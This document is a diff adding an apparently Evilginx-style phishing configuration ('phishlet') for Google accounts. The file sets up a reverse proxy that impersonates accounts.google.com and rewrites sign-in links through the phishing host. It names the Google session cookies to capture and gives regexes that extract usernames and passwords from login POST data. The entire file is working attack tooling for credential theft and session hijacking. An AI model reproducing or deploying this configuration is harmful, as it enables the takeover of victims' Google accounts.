@@ -1,0 +1,29 @@
+name: 'google'
+author: '@GregorioSecurity'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/signin/', replace: 'https://{hostname}/signin/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/speedbump/', replace: 'https://{hostname}/speedbump/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'href="://{hostname}', replace: 'href="https://ssl.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/CheckCookie', replace: 'https://{hostname}/CheckCookie', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID','CGIC','SNID', 'LSID','1P_JAR',]
+  - domain: 'accounts.google.com'
+    keys: ['GAPS', 'LSID']	
+credentials:
+  username:
+    key: 'f.req'
+    search: '\[*\[\"(.+?)\"'
+    type: 'post'
+  password:
+    key: 'f.req'
+    search: '\[.*\[\"(.+?)\"'
+    type: 'post'
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier'
+  path: '/ServiceLogin/identifier'
